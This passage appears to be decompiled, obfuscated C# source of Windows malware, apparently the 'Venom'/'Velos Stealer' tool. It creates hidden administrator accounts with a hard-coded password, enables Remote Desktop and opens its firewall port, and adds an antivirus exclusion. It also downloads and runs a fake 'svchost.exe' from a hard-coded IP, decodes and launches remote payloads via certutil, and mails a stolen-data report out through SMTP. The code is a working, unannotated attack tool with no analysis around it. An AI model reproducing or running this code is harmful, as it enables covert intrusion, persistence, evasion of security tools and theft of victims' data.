          Console.WriteLine("Creating New User");
          user1.Save();
        }
        catch (Exception ex)
        {
          Console.WriteLine("Failed to create user.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
          break;
        }
        GroupPrincipal groupPrincipal1 = (GroupPrincipal) null;
        try
        {
          groupPrincipal1 = GroupPrincipal.FindByIdentity(context1, "Administrators");
          if (groupPrincipal1 != null)
          {
            Console.WriteLine("Checking if itadmin is part of Administrators Group");
            if (groupPrincipal1.Members.Contains(context1, IdentityType.SamAccountName, identityValue1))
            {
              Console.WriteLine("Administrators already contains " + identityValue1);
              break;
            }
            Console.WriteLine("Adding itadmin to Administrators Group");
            groupPrincipal1.Members.Add(user1);
            groupPrincipal1.Save();
            break;
          }
          Console.WriteLine("Could not find the group Administrators");
        }
        catch (Exception ex)
        {
          Console.WriteLine("Exception adding user to group.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
        }
        Console.WriteLine("Cleaning Up");
        groupPrincipal1.Dispose();
        user1.Dispose();
        context1.Dispose();
        Console.WriteLine();
        Console.WriteLine("Press Any Key to Continue");
        Console.ReadLine();
        break;
      case 6:
        RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
        if (registryKey2 == null)
        {
          Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", RegistryKeyPermissionCheck.ReadWriteSubTree);
          registryKey2 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
          registryKey2.SetValue("dontdisplaylastusername", (object) 1);
        }
        else
          registryKey2.SetValue("dontdisplaylastusername", (object) 1);
        registryKey2.Flush();
        if (Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", true) == null)
        {
          Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", RegistryKeyPermissionCheck.ReadWriteSubTree);
          Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", true).SetValue("DWORD", (object) 2);
        }
        else
          registryKey2.SetValue("DWORD", (object) 2);
        registryKey2.Flush();
        string identityValue2 = user;
        string newPassword2 = user;
        PrincipalContext context2;
        try
        {
          Console.WriteLine("Building System Information");
          context2 = new PrincipalContext(ContextType.Machine, (string) null);
        }
        catch (Exception ex)
        {
          Console.WriteLine("Failed to create System Context.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
          break;
        }
        Console.WriteLine("Checking if User Exists.");
        if (UserPrincipal.FindByIdentity(context2, identityValue2) != null)
        {
          Console.WriteLine(identityValue2 + " already exists. Exiting!!");
          Console.ReadLine();
          break;
        }
        Console.WriteLine("Building User Information");
        UserPrincipal user2 = new UserPrincipal(context2);
        user2.Name = identityValue2;
        user2.DisplayName = "Venom Administrative User";
        user2.PasswordNeverExpires = true;
        user2.SetPassword(newPassword2);
        user2.Enabled = new bool?(true);
        try
        {
          Console.WriteLine("Creating New User");
          user2.Save();
        }
        catch (Exception ex)
        {
          Console.WriteLine("Failed to create user.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
          break;
        }
        GroupPrincipal groupPrincipal2 = (GroupPrincipal) null;
        try
        {
          groupPrincipal2 = GroupPrincipal.FindByIdentity(context2, "Administrators");
          if (groupPrincipal2 != null)
          {
            Console.WriteLine("Checking if itadmin is part of Administrators Group");
            if (groupPrincipal2.Members.Contains(context2, IdentityType.SamAccountName, identityValue2))
            {
              Console.WriteLine("Administrators already contains " + identityValue2);
              break;
            }
            Console.WriteLine("Adding itadmin to Administrators Group");
            groupPrincipal2.Members.Add(user2);
            groupPrincipal2.Save();
            break;
          }
          Console.WriteLine("Could not find the group Administrators");
        }
        catch (Exception ex)
        {
          Console.WriteLine("Exception adding user to group.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
        }
        Console.WriteLine("Cleaning Up");
        groupPrincipal2.Dispose();
        user2.Dispose();
        context2.Dispose();
        Console.WriteLine();
        Console.WriteLine("Press Any Key to Continue");
        Console.ReadLine();
        break;
      case 10:
        Process.Start(new ProcessStartInfo()
        {
          FileName = "cmd",
          Arguments = "/k start /b wusa /uninstall /kb:4471332 /quiet & exit",
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden,
          UseShellExecute = true,
          ErrorDialog = false
        });
        RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
        if (registryKey3 == null)
        {
          Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", RegistryKeyPermissionCheck.ReadWriteSubTree);
          registryKey3 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
          registryKey3.SetValue("dontdisplaylastusername", (object) 1);
        }
        else
          registryKey3.SetValue("dontdisplaylastusername", (object) 1);
        registryKey3.Flush();
        if (Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", true) == null)
        {
          Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", RegistryKeyPermissionCheck.ReadWriteSubTree);
          Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", true).SetValue("DWORD", (object) 2);
        }
        else
          registryKey3.SetValue("DWORD", (object) 2);
        registryKey3.Flush();
        string identityValue3 = "Venom";
        string newPassword3 = "Venom";
        PrincipalContext context3;
        try
        {
          Console.WriteLine("Building System Information");
          context3 = new PrincipalContext(ContextType.Machine, (string) null);
        }
        catch (Exception ex)
        {
          Console.WriteLine("Failed to create System Context.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
          break;
        }
        Console.WriteLine("Checking if User Exists.");
        if (UserPrincipal.FindByIdentity(context3, identityValue3) != null)
        {
          Console.WriteLine(identityValue3 + " already exists. Exiting!!");
          Console.ReadLine();
          break;
        }
        Console.WriteLine("Building User Information");
        UserPrincipal user3 = new UserPrincipal(context3);
        user3.Name = identityValue3;
        user3.DisplayName = "Venom Administrative User";
        user3.PasswordNeverExpires = true;
        user3.SetPassword(newPassword3);
        user3.Enabled = new bool?(true);
        try
        {
          Console.WriteLine("Creating New User");
          user3.Save();
        }
        catch (Exception ex)
        {
          Console.WriteLine("Failed to create user.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
          break;
        }
        GroupPrincipal groupPrincipal3 = (GroupPrincipal) null;
        try
        {
          groupPrincipal3 = GroupPrincipal.FindByIdentity(context3, "Administrators");
          if (groupPrincipal3 != null)
          {
            Console.WriteLine("Checking if itadmin is part of Administrators Group");
            if (groupPrincipal3.Members.Contains(context3, IdentityType.SamAccountName, identityValue3))
            {
              Console.WriteLine("Administrators already contains " + identityValue3);
              break;
            }
            Console.WriteLine("Adding itadmin to Administrators Group");
            groupPrincipal3.Members.Add(user3);
            groupPrincipal3.Save();
            break;
          }
          Console.WriteLine("Could not find the group Administrators");
        }
        catch (Exception ex)
        {
          Console.WriteLine("Exception adding user to group.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
        }
        Console.WriteLine("Cleaning Up");
        groupPrincipal3.Dispose();
        user3.Dispose();
        context3.Dispose();
        Console.WriteLine();
        Console.WriteLine("Press Any Key to Continue");
        Console.ReadLine();
        break;
    }
  }

  public static void 䢈槈\uFFFD\uF6A8䀏\uE09B䇍ゑ鼩䣴욖\u2854暀\uE0FC墤턎ꨘ\uEB34閽睉()
  {
    RegistryKey registryKey1 = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server", true);
    if (registryKey1 == null)
    {
      Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server", RegistryKeyPermissionCheck.ReadWriteSubTree);
      registryKey1 = Registry.CurrentUser.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server", true);
      registryKey1.SetValue("fDenyTSConnections", (object) 0);
    }
    else
      registryKey1.SetValue("fDenyTSConnections", (object) 0);
    registryKey1.Flush();
    RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp", true);
    if (registryKey2 == null)
    {
      Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp", RegistryKeyPermissionCheck.ReadWriteSubTree);
      registryKey2 = Registry.CurrentUser.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp", true);
      registryKey2.SetValue("UserAuthentication", (object) 1);
    }
    else
      registryKey2.SetValue("UserAuthentication", (object) 1);
    registryKey2.Flush();
    RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services", true);
    if (registryKey3 == null)
    {
      Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services", RegistryKeyPermissionCheck.ReadWriteSubTree);
      registryKey3 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services", true);
      registryKey3.SetValue("fSingleSessionPerUser", (object) 0);
    }
    else
      registryKey3.SetValue("fSingleSessionPerUser", (object) 0);
    registryKey3.Flush();
    RegistryKey registryKey4 = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp", true);
    if (registryKey4 == null)
    {
      Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server", RegistryKeyPermissionCheck.ReadWriteSubTree);
      registryKey4 = Registry.CurrentUser.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server", true);
      registryKey4.SetValue("fSingleSessionPerUser", (object) 0);
    }
    else
      registryKey4.SetValue("fSingleSessionPerUser", (object) 0);
    registryKey4.Flush();
    try
    {
      RegistryKey registryKey5 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList", true);
      if (registryKey5 != null && registryKey5.GetValue("Venom") != null)
        registryKey5.SetValue("Venom", (object) "0");
      Console.WriteLine("Venom desactivated");
    }
    catch (Exception ex)
    {
      ᒆ\uE9CD藷䰈콩헣\u248D榪쒷\uE171椐菹粉邀ꀥ퓱㖧鍁맯䎜.\u1A64沀萞鐞\uFFEBᅀ\uF77A\uFE3C\uE720霈竮\u292C꽍죸䅫笰䫌\uFFFD聰腚("New-ItemProperty -Path HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList -Name Venom -PropertyType DWord -Value 0 -Force");
    }
    RegistryKey registryKey6 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList", true);
    if (registryKey6 == null)
    {
      Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList", RegistryKeyPermissionCheck.ReadWriteSubTree);
      registryKey6 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList", true);
      registryKey6.SetValue("Venom", (object) 0);
    }
    else
      registryKey6.SetValue("Venom", (object) 0);
    registryKey6.Flush();
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b powershell –ExecutionPolicy Bypass -WindowStyle Hidden -Command Enable-NetFirewallRule -DisplayGroup 'Remote Desktop' & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b powershell –ExecutionPolicy Bypass -WindowStyle Hidden -Command netsh advfirewall firewall add rule name='allow RemoteDesktop' dir=in protocol=TCP localport=3389 action=allow & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b powershell –ExecutionPolicy Bypass -WindowStyle Hidden -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath %ProgramFiles%\\RDP Wrapper & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
  }

  public static void \u1A64沀萞鐞\uFFEBᅀ\uF77A\uFE3C\uE720霈竮\u292C꽍죸䅫笰䫌\uFFFD聰腚(string args) => new Process()
  {
    StartInfo = new ProcessStartInfo()
    {
      FileName = "powershell",
      Arguments = args,
      WindowStyle = ProcessWindowStyle.Hidden,
      CreateNoWindow = true
    }
  }.Start();

  public static void \uE87A国䗬ᇧ健慜悤\u33C7\uE079Փ嗙\uA4A3䧍劤ꢬ뚕針\uE279ஒ\u241C()
  {
    try
    {
      foreach (Process process in Process.GetProcessesByName("cmd"))
        process.Kill();
      foreach (Process process in Process.GetProcessesByName("conhost"))
        process.Kill();
      foreach (Process process in Process.GetProcessesByName("installrdp"))
        process.Kill();
      foreach (Process process in Process.GetProcessesByName("rdpinstall"))
        process.Kill();
      foreach (Process process in Process.GetProcessesByName("updaterdp"))
        process.Kill();
      foreach (Process process in Process.GetProcessesByName("Install"))
        process.Kill();
      foreach (Process process in Process.GetProcessesByName("winvnc"))
        process.Kill();
    }
    catch (Exception ex)
    {
      Console.WriteLine(ex.Message);
    }
  }

  public static void 㶵㵽\uF207繈줗Ⴐ鼠\uFFFD幄ृ\u3368ኖ믖͇㒏賃\uFFFD徏쓥鈊() => Process.Start(new ProcessStartInfo()
  {
    FileName = "cmd",
    Arguments = "/k start /b del /q/f/s %TEMP%\\* & exit",
    CreateNoWindow = true,
    WindowStyle = ProcessWindowStyle.Hidden,
    UseShellExecute = true,
    ErrorDialog = false
  });

  public static void 퍙詪ﶊ蛎眝ꐖ\uEFB3䢵鮟涳෫죊\uFFFD\u2E75៩愧몜᮷\u07BD紳()
  {
    ᒆ\uE9CD藷䰈콩헣\u248D榪쒷\uE171椐菹粉邀ꀥ퓱㖧鍁맯䎜.\uE87A国䗬ᇧ健慜悤\u33C7\uE079Փ嗙\uA4A3䧍劤ꢬ뚕針\uE279ஒ\u241C();
    ᒆ\uE9CD藷䰈콩헣\u248D榪쒷\uE171椐菹粉邀ꀥ퓱㖧鍁맯䎜.㶵㵽\uF207繈줗Ⴐ鼠\uFFFD幄ृ\u3368ኖ믖͇㒏賃\uFFFD徏쓥鈊();
    string fileName = Path.Combine(Path.GetTempPath(), "svchost.exe");
    new WebClient().DownloadFile("http://91.134.207.16/svchost.exe", fileName);
    Process.Start(fileName);
    Thread.Sleep(10000);
    ᒆ\uE9CD藷䰈콩헣\u248D榪쒷\uE171椐菹粉邀ꀥ퓱㖧鍁맯䎜.\uE87A国䗬ᇧ健慜悤\u33C7\uE079Փ嗙\uA4A3䧍劤ꢬ뚕針\uE279ஒ\u241C();
  }

  public static void 뀿솬椮跒㴍袿ᓴ\u1FFF细쓇짂ﱊ톐酅銝펦嫱흾斛摲(
    string filepath,
    string email,
    string toemail,
    string password,
    string token)
  {
    ᒆ\uE9CD藷䰈콩헣\u248D榪쒷\uE171椐菹粉邀ꀥ퓱㖧鍁맯䎜.ἅ奥\uF342ﵹ豓ꋼ憎竭蕖Բ䡳蓛竴㱽\u257A縋옭\uE71Bර\u2BFF();
    ᒆ\uE9CD藷䰈콩헣\u248D榪쒷\uE171椐菹粉邀ꀥ퓱㖧鍁맯䎜.䫣\u2152\u2616ꀱ㾦ਦꁆ\uF4FA悇\u26D8䣦\uEF51㔩눍繜룧暵ō\uA704ᩬ(token);
    try
    {
      StreamWriter streamWriter = new StreamWriter(Path.Combine(Path.GetTempPath(), "send.ps1"));
      Path.Combine(Path.GetTempPath(), "blat.exe");
      streamWriter.WriteLine("$SMTPServer = 'smtp.gmail.com';");
      streamWriter.WriteLine("$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587);");
      streamWriter.WriteLine("$SMTPInfo.EnableSsl = $true;");
      streamWriter.WriteLine("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('" + email + "', '" + password + "');");
      streamWriter.WriteLine("$ReportEmail = New-Object System.Net.Mail.MailMessage;");
      streamWriter.WriteLine("$ReportEmail.From = '" + email + "';");
      streamWriter.WriteLine("$ReportEmail.To.Add('" + toemail + "');");
      streamWriter.WriteLine("$ReportEmail.Subject = 'Velos Stealer Report';");
      streamWriter.WriteLine("$ReportEmail.Body = 'Velos Stealer report in the attachments.';");
      streamWriter.WriteLine("$ReportEmail.Attachments.Add('" + filepath + "');");
      streamWriter.WriteLine("$SMTPInfo.Send($ReportEmail);");
      streamWriter.Close();
      Thread.Sleep(5000);
      string str = Path.Combine(Path.GetTempPath(), "send.ps1");
      Process.Start(new ProcessStartInfo()
      {
        FileName = "cmd",
        Arguments = "/k start /b powershell -ExecutionPolicy Bypass " + str + "; & exit",
        CreateNoWindow = true,
        WindowStyle = ProcessWindowStyle.Hidden,
        UseShellExecute = true,
        ErrorDialog = false
      }).WaitForExit();
      Thread.Sleep(40000);
      ᒆ\uE9CD藷䰈콩헣\u248D榪쒷\uE171椐菹粉邀ꀥ퓱㖧鍁맯䎜.砓똠掳\uFFFD拫댑ꦧ\u2904躧꼧耆뵁鹇Ⰸ廘砭䉑䴯윏햯();
      \uEEA2抜鶘需謺ꍴ\uFFFD㛴ꆲ푐\uFFFDᯏᚇ䕫\uE44B᳥꤭虰\uE997ᆳ.돂攘饄큿㙶坄랾絔뒖ㄈ豹\u061D븨इ㗜\uFFFD鸜\u267Bꢺ㖪();
    }
    catch (Exception ex)
    {
    }
  }

  public static void 釛\uE4C8ㄼ爬䓬Ṟ\u291D䃣\u2E09敖摑ﾊ缚\uF204㤅뷼\u3019槣뉥\uE590(string dir, string zipPath) => Process.Start(new ProcessStartInfo()
  {
    FileName = "cmd",
    Arguments = "/k start /b powershell Compress-Archive -Path " + dir + " -DestinationPath " + zipPath + " & exit",
    CreateNoWindow = true,
    WindowStyle = ProcessWindowStyle.Hidden,
    UseShellExecute = true,
    ErrorDialog = false
  });

  public static void ﻥ껷삓멸\uFE3B濍\u2B7D骳뼞\uF4A4䯏頬㝥㕕垴\uFFFD樂判ꠤ㡹(string dir)
  {
    string path = Environment.GetEnvironmentVariable("temp") + "\\" + ᒆ\uE9CD藷䰈콩헣\u248D榪쒷\uE171椐菹粉邀ꀥ퓱㖧鍁맯䎜.ᡗ魦\uE4FB\uEF54ﭲᓙ栉\uE8FC\u21BE䘔灌\uF377譂椢ꃤ额뛍俄拙\uE2BF();
    if (!Directory.Exists(path))
      return;
    Directory.Delete(path);
  }

  public static string ᡗ魦\uE4FB\uEF54ﭲᓙ栉\uE8FC\u21BE䘔灌\uF377譂椢ꃤ额뛍俄拙\uE2BF()
  {
    string str = "";
    try
    {
      ManagementObject managementObject = new ManagementObject("win32_logicaldisk.deviceid=\"" + Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1) + ":\"");
      managementObject.Get();
      str = managementObject["VolumeSerialNumber"].ToString();
    }
    catch (Exception ex)
    {
    }
    return str;
  }

  public static void ṫ쫅鯽嘪鍣혅䈾揁臂溧勤簫\uFFFD觪큕랇쫆\uDB3E\uDE53ᠾ()
  {
    new ServiceController("TermService").Stop();
    ᒆ\uE9CD藷䰈콩헣\u248D榪쒷\uE171椐菹粉邀ꀥ퓱㖧鍁맯䎜.\uE87A国䗬ᇧ健慜悤\u33C7\uE079Փ嗙\uA4A3䧍劤ꢬ뚕針\uE279ஒ\u241C();
    ᒆ\uE9CD藷䰈콩헣\u248D榪쒷\uE171椐菹粉邀ꀥ퓱㖧鍁맯䎜.㶵㵽\uF207繈줗Ⴐ鼠\uFFFD幄ृ\u3368ኖ믖͇㒏賃\uFFFD徏쓥鈊();
    string str = "C:\\Program Files\\RDP Wrapper\\uninstall.bat";
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b powershell " + str + " & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    string path = "C:\\Program Files\\RDP Wrapper";
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b del /q/f/s " + path + " & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Directory.Delete(path, true);
    ᒆ\uE9CD藷䰈콩헣\u248D榪쒷\uE171椐菹粉邀ꀥ퓱㖧鍁맯䎜.釀\u0B98턶ⲇ\u0CE5\uF58C荟㬺ࠥ\uE9F5ꙛᵺ뮸\uF8AF뾵愳\uF278ہ쭏뀫();
    System.IO.File.SetAttributes(path, FileAttributes.Normal);
    System.IO.File.Delete(path);
  }

  public static void 茣ﮟ褐\uA493Ꞁ덣ﰑ\uF22F眘魪\uFFFD\u28E4쫥訉駉女ꆖ䉈㹑썳()
  {
    ᒆ\uE9CD藷䰈콩헣\u248D榪쒷\uE171椐菹粉邀ꀥ퓱㖧鍁맯䎜.\uE87A国䗬ᇧ健慜悤\u33C7\uE079Փ嗙\uA4A3䧍劤ꢬ뚕針\uE279ஒ\u241C();
    ᒆ\uE9CD藷䰈콩헣\u248D榪쒷\uE171椐菹粉邀ꀥ퓱㖧鍁맯䎜.㶵㵽\uF207繈줗Ⴐ鼠\uFFFD幄ृ\u3368ኖ믖͇㒏賃\uFFFD徏쓥鈊();
    ᒆ\uE9CD藷䰈콩헣\u248D榪쒷\uE171椐菹粉邀ꀥ퓱㖧鍁맯䎜.黿愭쌸蟎\u0008ꡑ錛ŧ詙᱑烍睽\uFBD0啕늍익\uEFA8声骟橜();
    string path = "C:\\Windows\\vnc";
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b del /q/f/s " + path + " & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Directory.Delete(path, true);
    ᒆ\uE9CD藷䰈콩헣\u248D榪쒷\uE171椐菹粉邀ꀥ퓱㖧鍁맯䎜.釀\u0B98턶ⲇ\u0CE5\uF58C荟㬺ࠥ\uE9F5ꙛᵺ뮸\uF8AF뾵愳\uF278ہ쭏뀫();
    System.IO.File.SetAttributes(path, FileAttributes.Normal);
    System.IO.File.Delete(path);
  }

  public static void 釀\u0B98턶ⲇ\u0CE5\uF58C荟㬺ࠥ\uE9F5ꙛᵺ뮸\uF8AF뾵愳\uF278ہ쭏뀫()
  {
    if (System.IO.File.Exists("C:\\Program Files\\RDP Wrapper\\rdpwrap.dll"))
    {
      try
      {
        System.IO.File.Delete("C:\\Program Files\\RDP Wrapper\\rdpwrap.ini");
      }
      catch (IOException ex)
      {
        Console.WriteLine(ex.Message);
        return;
      }
    }
    FileInfo fileInfo = new FileInfo("C:\\Program Files\\RDP Wrapper\\rdpwrap.dll");
    try
    {
      fileInfo.Delete();
    }
    catch (IOException ex)
    {
      Console.WriteLine(ex.Message);
    }
    try
    {
      Directory.Delete("C:\\Program Files\\RDP Wrapper");
    }
    catch (IOException ex)
    {
      Console.WriteLine(ex.Message);
    }
    if (Directory.Exists("C:\\Program Files\\RDP Wrapper"))
    {
      try
      {
        Directory.Delete("C:\\Program Files\\RDP Wrapper", true);
      }
      catch (IOException ex)
      {
        Console.WriteLine(ex.Message);
      }
    }
    DirectoryInfo directoryInfo = new DirectoryInfo("C:\\Program Files\\RDP Wrapper");
    try
    {
      directoryInfo.Delete(true);
    }
    catch (IOException ex)
    {
      Console.WriteLine(ex.Message);
    }
    string path = "C:\\Program Files\\RDP Wrapper";
    FileSecurity accessControl = System.IO.File.GetAccessControl(path);
    SecurityIdentifier user = WindowsIdentity.GetCurrent().User;
    accessControl.SetOwner((System.Security.Principal.IdentityReference) user);
    accessControl.SetAccessRule(new FileSystemAccessRule((System.Security.Principal.IdentityReference) user, FileSystemRights.FullControl, AccessControlType.Allow));
    System.IO.File.SetAccessControl(path, accessControl);
    System.IO.File.Delete(path);
  }

  public static void \uEAFC狀\uF017ᥕ扇姏솉\u0BA6喦䟎綮穼侂퇦\uF215믉ꂮ壓\u3389渵(string link, string decodedfile)
  {
    string path1 = Path.Combine(仂읤\uEC15솟콱윯蠻ꉹὲ樠ꮟ듌ﭤ뒉無롫ങ秽\u259B䀂.ﭞ軈쉈\u0A04\uEA79\u208F\uF34A瓖髿\uEE29䟜뾏\u2B75褨詚둬\u2666ዅ뛧쿐, 仂읤\uEC15솟콱윯蠻ꉹὲ樠ꮟ듌ﭤ뒉無롫ങ秽\u259B䀂.돷ꖓ偓连ဵ膔\uA87E섛\uEC24馷옛ᐱ玄몋进춥빮\uF26E\uEC79\uFFFD);
    string fileName = Path.Combine(path1, "encrypt.txt");
    string path = Path.Combine(path1, decodedfile);
    new WebClient().DownloadFile(link, fileName);
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b certutil -decode " + fileName + "  " + path + "  & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    }).WaitForExit();
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b " + path + "  & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    System.IO.File.SetAttributes(path, FileAttributes.Hidden);
  }

  public static void 뼙묬괷検ౚ㸋\u264E쐙\uEA01懔ⷖⶹᕗ\uFFFDឮ\u2A0F텔䒌\uFFFD㪵(
    string link,
    string encrypted,
    string decodedfile)
  {
    string path1 = Path.Combine(仂읤\uEC15솟콱윯蠻ꉹὲ樠ꮟ듌ﭤ뒉無롫ങ秽\u259B䀂.ﭞ軈쉈\u0A04\uEA79\u208F\uF34A瓖髿\uEE29䟜뾏\u2B75褨詚둬\u2666ዅ뛧쿐, 仂읤\uEC15솟콱윯蠻ꉹὲ樠ꮟ듌ﭤ뒉無롫ങ秽\u259B䀂.돷ꖓ偓连ဵ膔\uA87E섛\uEC24馷옛ᐱ玄몋进춥빮\uF26E\uEC79\uFFFD);
    string fileName = Path.Combine(path1, encrypted);
    string path = Path.Combine(path1, decodedfile);
    new WebClient().DownloadFile(link, fileName);
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b certutil -decode " + fileName + "  " + path + "  & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    }).WaitForExit();
    \uF5C7\u2748卅굝쓠灕칸뤅\uFFFDᤇ\u2BEF㙾\u2FB2繅\u2D9A뭚䭉㽩寈雭.\u0337䒿云\u270D渖ၾ\u245C嫵씛딼\uE4D3琧\uEDDE嚂긻\uE62E\uAAD3㴠\u1BFFϪ(new string[1]
    {
      path
    });
    System.IO.File.SetAttributes(path, FileAttributes.Hidden);
  }

  public static void 磑ᒵ呉泏脚偮ꖓ\u28EF쵎\u19DEⱂ梗\u334F汒뗈Ⱚ퀔钒譒箲(
    string link,
    string encrypted,
    string decodedfile)
  {
    string path1 = Path.Combine(仂읤\uEC15솟콱윯蠻ꉹὲ樠ꮟ듌ﭤ뒉無롫ങ秽\u259B䀂.ﭞ軈쉈\u0A04\uEA79\u208F\uF34A瓖髿\uEE29䟜뾏\u2B75褨詚둬\u2666ዅ뛧쿐, 仂읤\uEC15솟콱윯蠻ꉹὲ樠ꮟ듌ﭤ뒉無롫ങ秽\u259B䀂.돷ꖓ偓连ဵ膔\uA87E섛\uEC24馷옛ᐱ玄몋进춥빮\uF26E\uEC79\uFFFD);
    string fileName = Path.Combine(path1, encrypted);
    string path = Path.Combine(path1, decodedfile);
    new WebClient().DownloadFile(link, fileName);
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b certutil -decode " + fileName + "  " + path + "  & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    }).WaitForExit();
    System.IO.File.SetAttributes(path, FileAttributes.Hidden);
  }

  public static void \uE64B曁ণ띖崖\u2846੦ퟖ\uFFFD蒲\u0CD9ⶻ䴣俴侥\u2FD0햨蹝촣\u2733(string link, string name)
  {
